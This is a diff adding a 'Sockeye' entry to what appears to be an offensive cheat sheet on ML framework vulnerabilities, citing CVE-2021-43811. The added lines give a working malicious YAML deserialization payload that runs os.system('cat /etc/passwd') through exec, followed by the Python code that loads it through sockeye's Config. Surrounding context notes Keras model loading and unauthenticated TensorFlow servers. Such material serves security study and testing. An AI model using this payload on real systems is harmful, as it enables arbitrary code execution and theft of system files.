@@ -92,6 +92,23 @@ from keras.models import load_model
 load_model("my_model.h5")
 ```
 
+### Sockeye
+> reference: https://github.com/s-index/CVE-2021-43811
+
+- create malious yaml
+```
+!!python/object/new:type
+args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
+listitems: "__import__('os').system('cat /etc/passwd')"
+```
+
+- load config
+```
+from sockeye.config import Config
+c = Config()
+c.load('./malicious.yml')
+```
+
 ### TensorFlow Server unauthorized access
 > For performance reasons, the default TensorFlow server does not include any authorization protocol and sends messages unencrypted. It accepts connections from anywhere, and executes the graphs it is sent without performing any checks.”
 
